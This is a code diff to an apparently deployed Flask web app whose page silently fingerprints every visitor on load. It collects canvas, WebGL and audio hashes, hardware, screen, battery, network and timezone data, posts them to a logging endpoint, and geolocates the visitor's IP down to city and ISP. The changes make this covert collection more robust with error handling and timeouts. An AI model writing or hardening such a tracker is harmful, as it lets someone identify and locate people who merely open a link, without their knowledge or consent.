@@ -56,7 +56,9 @@ HTML_PAGE = """
 
         async function getAudioFingerprint() {
             try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return "Unsupported";
+                const audioCtx = new AudioContext();
                 const oscillator = audioCtx.createOscillator();
                 const analyser = audioCtx.createAnalyser();
                 const gainNode = audioCtx.createGain();
@@ -73,17 +75,23 @@ HTML_PAGE = """
 
                 return new Promise((resolve) => {
                     scriptProcessor.onaudioprocess = function (e) {
-                        const output = e.inputBuffer.getChannelData(0);
-                        let sum = 0;
-                        for (let i = 0; i < output.length; i++) {
-                            sum += Math.abs(output[i]);
+                        try {
+                            const output = e.inputBuffer.getChannelData(0);
+                            let sum = 0;
+                            for (let i = 0; i < output.length; i++) {
+                                sum += Math.abs(output[i]);
+                            }
+                            scriptProcessor.onaudioprocess = null;
+                            oscillator.stop();
+                            audioCtx.close();
+                            resolve(simpleHash(sum.toString()));
+                        } catch (err) {
+                            resolve("Audio Error");
                         }
-                        scriptProcessor.onaudioprocess = null;
-                        oscillator.stop();
-                        audioCtx.close();
-                        resolve(simpleHash(sum.toString()));
                     };
                     oscillator.start(0);
+                    // Timeout fallback if audio processor hangs
+                    setTimeout(() => resolve("Timeout"), 1000);
                 });
             } catch (e) {
                 return "Unsupported";
@@ -91,56 +99,58 @@ HTML_PAGE = """
         }
 
         window.onload = async function() {
-            const webgl = getWebGLInfo();
-            const audioHash = await getAudioFingerprint();
+            let webgl = { vendor: 'Error', renderer: 'Error' };
+            let audioHash = 'Unsupported';
+
+            try { webgl = getWebGLInfo(); } catch(e) {}
+            try { audioHash = await getAudioFingerprint(); } catch(e) {}
 
             const fingerprint = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                screenResolution: window.screen.width + "x" + window.screen.height,
-                availResolution: window.screen.availWidth + "x" + window.screen.availHeight,
-                colorDepth: window.screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                language: navigator.language,
-                languages: navigator.languages,
+                platform: navigator.platform || 'Unknown',
+                userAgent: navigator.userAgent || 'Unknown',
+                screenResolution: (window.screen.width || 0) + "x" + (window.screen.height || 0),
+                availResolution: (window.screen.availWidth || 0) + "x" + (window.screen.availHeight || 0),
+                colorDepth: window.screen.colorDepth || 'Unknown',
+                pixelRatio: window.devicePixelRatio || 1,
+                language: navigator.language || 'Unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                 deviceMemory: navigator.deviceMemory || 'Unknown',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
                 cookieEnabled: navigator.cookieEnabled,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                 canvasHash: getCanvasFingerprint(),
                 webglVendor: webgl.vendor,
                 webglRenderer: webgl.renderer,
                 audioFingerprint: audioHash
             };
 
-            if (navigator.userAgentData) {
-                fingerprint.mobile = navigator.userAgentData.mobile;
-                fingerprint.brands = navigator.userAgentData.brands.map(b => b.brand + " v" + b.version).join(", ");
-                fingerprint.platformDetails = navigator.userAgentData.platform;
-            }
+            try {
+                if (navigator.userAgentData) {
+                    fingerprint.mobile = navigator.userAgentData.mobile;
+                    fingerprint.brands = navigator.userAgentData.brands.map(b => b.brand + " v" + b.version).join(", ");
+                    fingerprint.platformDetails = navigator.userAgentData.platform;
+                }
+            } catch(e) {}
 
-            if (screen.orientation) {
-                fingerprint.orientation = screen.orientation.type;
-            }
-
-            if (navigator.getBattery) {
-                try {
+            try {
+                if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     fingerprint.batteryLevel = Math.round(battery.level * 100) + '%';
                     fingerprint.batteryCharging = battery.charging;
-                } catch (e) {
-                    fingerprint.batteryLevel = 'Unavailable';
                 }
+            } catch (e) {
+                fingerprint.batteryLevel = 'Unavailable';
             }
 
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                fingerprint.effectiveType = connection.effectiveType || 'Unknown';
-                fingerprint.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
-                fingerprint.rtt = connection.rtt ? connection.rtt + ' ms' : 'Unknown';
-            }
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    fingerprint.effectiveType = connection.effectiveType || 'Unknown';
+                    fingerprint.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
+                }
+            } catch(e) {}
 
+            // Send payload securely
             fetch('/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -165,14 +175,13 @@ def get_location_from_ip(ip_address):
         with urllib.request.urlopen(req, timeout=3) as response:
             data = json.loads(response.read().decode())
             if data.get('status') == 'success':
-                return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')} (ISP: {data.get('isp')})"
+                return f"{data.get('city')}, {data.get('regionName')} ({data.get('country')}) [ISP: {data.get('isp')}]"
     except Exception:
         pass
     return "Lookup Failed"
 
 @app.route('/')
 def home():
-    # Properly grab the real client IP passed through Render's proxy headers
     if request.headers.get('CF-Connecting-IP'):
         client_ip = request.headers.get('CF-Connecting-IP')
     elif request.headers.get('X-Forwarded-For'):
@@ -199,15 +208,15 @@ def log_device():
         print(f" * GPU Renderer      : {data.get('webglRenderer')}")
         print(f" * Canvas Hash       : {data.get('canvasHash')}")
         print(f" * Audio Hash        : {data.get('audioFingerprint')}")
-        print(f" * OS / Platform     : {data.get('platform')} ({data.get('platformDetails')})")
-        print(f" * Mobile Device?    : {data.get('mobile')}")
+        print(f" * OS / Platform     : {data.get('platform')} ({data.get('platformDetails', 'N/A')})")
+        print(f" * Mobile Device?    : {data.get('mobile', False)}")
         print(f" * Timezone          : {data.get('timezone')}")
         print(f" * Screen Resolution : {data.get('screenResolution')} (Avail: {data.get('availResolution')})")
         print(f" * Color Depth       : {data.get('colorDepth')}-bit | Pixel Ratio: {data.get('pixelRatio')}")
         print(f" * CPU Cores         : {data.get('hardwareConcurrency')}")
         print(f" * Estimated RAM     : {data.get('deviceMemory')} GB")
         print(f" * Network Speed     : {data.get('effectiveType')} (~{data.get('downlink')})")
-        print(f" * Battery Status    : {data.get('batteryLevel')} (Charging: {data.get('batteryCharging')})")
+        print(f" * Battery Status    : {data.get('batteryLevel', 'N/A')}")
         print(f"------------------------------------------------------------------\n")
     return '', 204
 
